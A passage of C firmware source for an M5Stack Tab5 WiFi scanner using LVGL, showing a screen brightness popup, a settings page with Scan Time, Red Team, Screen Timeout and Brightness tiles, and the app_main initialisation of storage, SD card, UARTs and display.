    lv_obj_add_event_cb(close_btn, screen_timeout_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *close_label = lv_label_create(close_btn);
    lv_label_set_text(close_label, "Close");
    lv_obj_set_style_text_font(close_label, &lv_font_montserrat_16, 0);
    lv_obj_center(close_label);
}

// Close Screen Brightness popup
static void close_screen_brightness_popup(void)
{
    if (screen_brightness_popup_overlay) {
        lv_obj_del(screen_brightness_popup_overlay);
        screen_brightness_popup_overlay = NULL;
        screen_brightness_popup_obj = NULL;
        screen_brightness_slider = NULL;
        screen_brightness_value_label = NULL;
    }
}

// Screen brightness slider change callback
static void screen_brightness_slider_cb(lv_event_t *e)
{
    lv_obj_t *slider = lv_event_get_target(e);
    int32_t value = lv_slider_get_value(slider);
    
    // Update brightness immediately with gamma correction (full 12-bit precision)
    screen_brightness_setting = (uint8_t)value;
    set_brightness_gamma(screen_brightness_setting);
    
    // Update label
    if (screen_brightness_value_label) {
        char buf[16];
        snprintf(buf, sizeof(buf), "%d%%", screen_brightness_setting);
        lv_label_set_text(screen_brightness_value_label, buf);
    }
}

// Screen brightness slider release callback - save to NVS
static void screen_brightness_slider_release_cb(lv_event_t *e)
{
    lv_obj_t *slider = lv_event_get_target(e);
    int32_t value = lv_slider_get_value(slider);
    
    screen_brightness_setting = (uint8_t)value;
    save_screen_brightness_to_nvs(screen_brightness_setting);
    ESP_LOGI(TAG, "Screen brightness saved: %d%%", screen_brightness_setting);
}

// Screen brightness close button callback
static void screen_brightness_close_cb(lv_event_t *e)
{
    (void)e;
    // Ensure brightness is set to saved value before closing
    set_brightness_gamma(screen_brightness_setting);
    close_screen_brightness_popup();
}

// Show Screen Brightness popup with slider
static void show_screen_brightness_popup(void)
{
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay (transparent - no dimming, so user sees actual brightness effect)
    screen_brightness_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(screen_brightness_popup_overlay);
    lv_obj_set_size(screen_brightness_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_opa(screen_brightness_popup_overlay, LV_OPA_TRANSP, 0);
    lv_obj_clear_flag(screen_brightness_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(screen_brightness_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    screen_brightness_popup_obj = lv_obj_create(screen_brightness_popup_overlay);
    lv_obj_set_size(screen_brightness_popup_obj, 400, 250);
    lv_obj_center(screen_brightness_popup_obj);
    lv_obj_set_style_bg_color(screen_brightness_popup_obj, lv_color_hex(0x2D2D2D), 0);
    lv_obj_set_style_border_color(screen_brightness_popup_obj, COLOR_MATERIAL_CYAN, 0);
    lv_obj_set_style_border_width(screen_brightness_popup_obj, 2, 0);
    lv_obj_set_style_radius(screen_brightness_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(screen_brightness_popup_obj, 20, 0);
    lv_obj_set_flex_flow(screen_brightness_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(screen_brightness_popup_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(screen_brightness_popup_obj, 15, 0);
    lv_obj_clear_flag(screen_brightness_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(screen_brightness_popup_obj);
    lv_label_set_text(title, "Screen Brightness");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_CYAN, 0);
    
    // Value label
    screen_brightness_value_label = lv_label_create(screen_brightness_popup_obj);
    char buf[16];
    snprintf(buf, sizeof(buf), "%d%%", screen_brightness_setting);
    lv_label_set_text(screen_brightness_value_label, buf);
    lv_obj_set_style_text_font(screen_brightness_value_label, &lv_font_montserrat_32, 0);
    lv_obj_set_style_text_color(screen_brightness_value_label, lv_color_hex(0xFFFFFF), 0);
    
    // Slider
    screen_brightness_slider = lv_slider_create(screen_brightness_popup_obj);
    lv_obj_set_width(screen_brightness_slider, 300);
    lv_slider_set_range(screen_brightness_slider, 1, 100);
    lv_slider_set_value(screen_brightness_slider, screen_brightness_setting, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(screen_brightness_slider, lv_color_hex(0x444444), LV_PART_MAIN);
    lv_obj_set_style_bg_color(screen_brightness_slider, COLOR_MATERIAL_CYAN, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(screen_brightness_slider, COLOR_MATERIAL_CYAN, LV_PART_KNOB);
    lv_obj_add_event_cb(screen_brightness_slider, screen_brightness_slider_cb, LV_EVENT_VALUE_CHANGED, NULL);
    lv_obj_add_event_cb(screen_brightness_slider, screen_brightness_slider_release_cb, LV_EVENT_RELEASED, NULL);
    
    // Close button
    lv_obj_t *close_btn = lv_btn_create(screen_brightness_popup_obj);
    lv_obj_set_size(close_btn, 100, 40);
    lv_obj_set_style_bg_color(close_btn, COLOR_MATERIAL_CYAN, 0);
    lv_obj_add_event_cb(close_btn, screen_brightness_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *close_label = lv_label_create(close_btn);
    lv_label_set_text(close_label, "Close");
    lv_obj_set_style_text_font(close_label, &lv_font_montserrat_16, 0);
    lv_obj_center(close_label);
}

static void settings_back_btn_event_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Settings back button clicked, returning to internal tiles");
    
    // Hide settings page
    if (internal_settings_page) {
        lv_obj_add_flag(internal_settings_page, LV_OBJ_FLAG_HIDDEN);
    }
    
    // Show internal tiles
    if (internal_tiles) {
        lv_obj_clear_flag(internal_tiles, LV_OBJ_FLAG_HIDDEN);
    }
}

static void settings_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "Settings tile clicked: %s", tile_name);
    
    if (strcmp(tile_name, "Scan Time") == 0) {
        show_scan_time_popup();
    } else if (strcmp(tile_name, "Red Team") == 0) {
        show_red_team_settings_page();
    } else if (strcmp(tile_name, "Screen Timeout") == 0) {
        show_screen_timeout_popup();
    } else if (strcmp(tile_name, "Screen Brightness") == 0) {
        show_screen_brightness_popup();
    }
}

// Show Settings page with UART Pins and Scan Time tiles (inside INTERNAL container)
static void show_settings_page(void)
{
    if (!internal_container) {
        ESP_LOGE(TAG, "Internal container not initialized!");
        return;
    }
    
    // Hide internal tiles, show settings page
    if (internal_tiles) lv_obj_add_flag(internal_tiles, LV_OBJ_FLAG_HIDDEN);
    
    // If settings page already exists, just show it
    if (internal_settings_page) {
        lv_obj_clear_flag(internal_settings_page, LV_OBJ_FLAG_HIDDEN);
        settings_page = internal_settings_page;  // Update legacy reference
        ESP_LOGI(TAG, "Showing existing settings page");
        return;
    }
    
    ESP_LOGI(TAG, "Creating new settings page");
    
    // Create settings page container inside internal container
    internal_settings_page = lv_obj_create(internal_container);
    settings_page = internal_settings_page;  // Keep legacy reference
    lv_obj_set_size(settings_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(settings_page, lv_color_hex(0x121212), 0);
    lv_obj_set_style_border_width(settings_page, 0, 0);
    lv_obj_set_style_pad_all(settings_page, 16, 0);
    lv_obj_set_flex_flow(settings_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(settings_page, 16, 0);
    lv_obj_clear_flag(settings_page, LV_OBJ_FLAG_SCROLLABLE);
    
    // Header with back button and title
    lv_obj_t *header = lv_obj_create(settings_page);
    lv_obj_set_size(header, lv_pct(100), 50);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 80, 40);
    lv_obj_align(back_btn, LV_ALIGN_LEFT_MID, 0, 0);
    lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_add_event_cb(back_btn, settings_back_btn_event_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_label = lv_label_create(back_btn);
    lv_label_set_text(back_label, LV_SYMBOL_LEFT " Back");
    lv_obj_center(back_label);
    
    // Title
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Settings");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, lv_color_hex(0xFFFFFF), 0);
    lv_obj_align(title, LV_ALIGN_CENTER, 0, 0);
    
    // Tiles container
    lv_obj_t *tiles = lv_obj_create(settings_page);
    lv_obj_set_size(tiles, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(tiles, 20, 0);
    lv_obj_set_style_pad_row(tiles, 20, 0);
    lv_obj_clear_flag(tiles, LV_OBJ_FLAG_SCROLLABLE);
    
    // Scan Time tile
    create_tile(tiles, LV_SYMBOL_REFRESH, "Scan\nTime", COLOR_MATERIAL_GREEN, settings_tile_event_cb, "Scan Time");
    
    // Red Team tile
    create_tile(tiles, LV_SYMBOL_WARNING, "Red\nTeam", COLOR_MATERIAL_RED, settings_tile_event_cb, "Red Team");
    
    // Screen Timeout tile
    create_tile(tiles, LV_SYMBOL_EYE_CLOSE, "Screen\nTimeout", COLOR_MATERIAL_AMBER, settings_tile_event_cb, "Screen Timeout");
    
    // Screen Brightness tile
    create_tile(tiles, LV_SYMBOL_IMAGE, "Screen\nBrightness", COLOR_MATERIAL_CYAN, settings_tile_event_cb, "Screen Brightness");
}

void app_main(void)
{
    ESP_LOGI(TAG, "M5Stack Tab5 WiFi Scanner");
    
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    
    // Initialize all tab contexts with PSRAM allocations
    init_all_tab_contexts();
    
    // Legacy observer buffers (shared between tabs for UART I/O)
    observer_networks = heap_caps_calloc(MAX_OBSERVER_NETWORKS, sizeof(observer_network_t), MALLOC_CAP_SPIRAM);
    observer_rx_buffer = heap_caps_malloc(UART_BUF_SIZE, MALLOC_CAP_SPIRAM);
    observer_line_buffer = heap_caps_malloc(OBSERVER_LINE_BUFFER_SIZE, MALLOC_CAP_SPIRAM);
    
    if (!observer_networks || !observer_rx_buffer || !observer_line_buffer) {
        ESP_LOGE(TAG, "Failed to allocate legacy observer PSRAM buffers!");
    }
    
    // Allocate buffer for ESP Modem WiFi scan results
    ESP_LOGI(TAG, "Allocating ESP Modem buffers in PSRAM...");
    esp_modem_networks = heap_caps_calloc(ESP_MODEM_MAX_NETWORKS, sizeof(wifi_ap_record_t), MALLOC_CAP_SPIRAM);
    if (!esp_modem_networks) {
        ESP_LOGE(TAG, "Failed to allocate PSRAM buffer for ESP Modem!");
    } else {
        ESP_LOGI(TAG, "ESP Modem PSRAM buffer allocated successfully");
    }
    
    // Initialize I2C (required for IO expander)
    ESP_ERROR_CHECK(bsp_i2c_init());
    
    // Initialize IO expander
    bsp_io_expander_pi4ioe_init(bsp_i2c_get_handle());
    
    // Initialize SD card
    ESP_LOGI(TAG, "Initializing SD card...");
    ret = bsp_sdcard_init(CONFIG_BSP_SD_MOUNT_POINT, 5);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "SD card initialization failed: %s (captive portal HTML files won't be available)", esp_err_to_name(ret));
    } else {
        ESP_LOGI(TAG, "SD card mounted at %s", CONFIG_BSP_SD_MOUNT_POINT);
    }
    
    // Enable battery charging
    ESP_LOGI(TAG, "Enabling battery charging...");
    bsp_set_charge_en(true);
    bsp_set_charge_qc_en(true);
    
    // Load Red Team setting from NVS (hardware config is now auto-detected)
    load_red_team_from_nvs();
    
    // Load screen settings from NVS (timeout and brightness)
    load_screen_settings_from_nvs();
    
    // Initialize both UARTs for board detection
    // UART1: Grove (TX=53, RX=54) - always initialized
    // MBus port: M5Bus connector (TX=37, RX=38)
    uart_init();   // Initialize UART1
    init_uart2();  // Initialize MBus port (UART2)
    
    // Initialize display
    lv_display_t *disp = bsp_display_start();
    if (disp == NULL) {
        ESP_LOGE(TAG, "Failed to initialize display");
        return;
    }
    
    // Set display brightness from saved setting with gamma correction
    set_brightness_gamma(screen_brightness_setting);
    
    // Initialize screen timeout
    last_activity_time = lv_tick_get();
    lv_indev_t *touch_indev = bsp_display_get_input_dev();
    if (touch_indev) {
        lv_indev_add_event_cb(touch_indev, touch_activity_cb, LV_EVENT_PRESSED, NULL);
        uint32_t timeout_ms = get_screen_timeout_ms();
        if (timeout_ms == UINT32_MAX) {
            ESP_LOGI(TAG, "Screen timeout disabled (Stays On)");
        } else {
            ESP_LOGI(TAG, "Screen timeout enabled: %lu ms", (unsigned long)timeout_ms);
        }
    } else {
        ESP_LOGW(TAG, "Touch input device not available, screen timeout disabled");
    }
    screen_timeout_timer = lv_timer_create(screen_timeout_timer_cb, SCREEN_CHECK_INTERVAL, NULL);
    
    // Show splash screen with animation (will transition to main tiles when done)
    bsp_display_lock(0);
    show_splash_screen();
    bsp_display_unlock();
    
    ESP_LOGI(TAG, "Application started. Ready to scan.");
}
